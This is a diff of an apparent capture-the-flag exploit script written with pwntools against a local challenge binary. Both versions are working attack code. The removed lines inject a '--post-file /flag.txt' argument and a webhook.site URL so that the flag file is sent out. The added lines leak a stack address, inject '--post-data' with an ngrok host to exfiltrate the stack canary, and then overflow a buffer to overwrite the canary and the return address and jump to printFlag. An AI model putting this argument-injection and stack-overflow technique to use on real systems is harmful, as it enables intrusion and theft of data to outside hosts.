@@ -1,22 +1,61 @@
 from pwn import *
 
 conn=remote("localhost", 4444)
+#conn=process("../src/chall")
 elf=ELF("../src/chall")
 
-conn.recvuntil(b"book: ")
+conn.recvuntil(b">")
+conn.sendline(b"3")
+conn.sendline(b"")
+conn.sendline(b"")
+conn.recvuntil(b">")
+conn.sendline(b"1")
+conn.sendline(b"a")
+conn.recvuntil(b"Action ")
+leak=int(conn.recvuntil(b' ').decode())
 
-conn.sendline(b"--post-file\x00/flag.txt\x00");
+print(hex(leak))
 
+canary_address=leak-320+1
 
-payload=b"https://webhook.site/ca2c4a10-2803-4383-8659-204728de5a36\x00"
-payload=payload+b"\x00"*(162-len(payload))
+print(hex(canary_address))
 
-payload+=p64(elf.symbols["name"])
-payload+=p64(elf.symbols["name"]+12)
-payload+=p64(0x0)
-
+conn.sendline(b"5")
+conn.recvuntil(b">")
+conn.sendline(b"4")
+conn.sendline(b"--post-data\x00")
+conn.sendline(b"2")
+payload=b"http://7.tcp.eu.ngrok.io:11689"
+payload += b"\x00" * (130-len(payload))
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(elf.symbols['name'])
+payload += p64(canary_address)
+payload += p64(0)
 #gdb.attach(conn)
-
 conn.sendline(payload)
 
+canary=int(input("canary? ")[2:], 16)
+print(hex(canary))
+conn.recvuntil(b">")
+conn.sendline(b"2")
+payload=b"http://www.google.com"
+payload += b"\x00"* (130-len(payload))
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+
+payload += p64(canary)
+payload += p64(0)
+payload += p64(elf.symbols['printFlag'])
+#gdb.attach(conn)
+conn.sendline(payload)
 conn.interactive()
